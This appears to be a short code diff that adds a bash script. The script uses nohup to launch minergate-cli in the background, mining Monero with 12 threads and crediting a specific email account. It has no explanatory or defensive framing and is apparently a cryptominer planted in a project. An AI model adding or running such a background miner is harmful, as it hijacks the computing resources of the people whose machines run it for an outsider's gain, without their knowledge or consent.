@@ -1,0 +1,4 @@
+#!/bin/bash
+nohup minergate-cli -user zzzsunzzz@protonmail.com -xmr 12
+
+# huykhacxuan
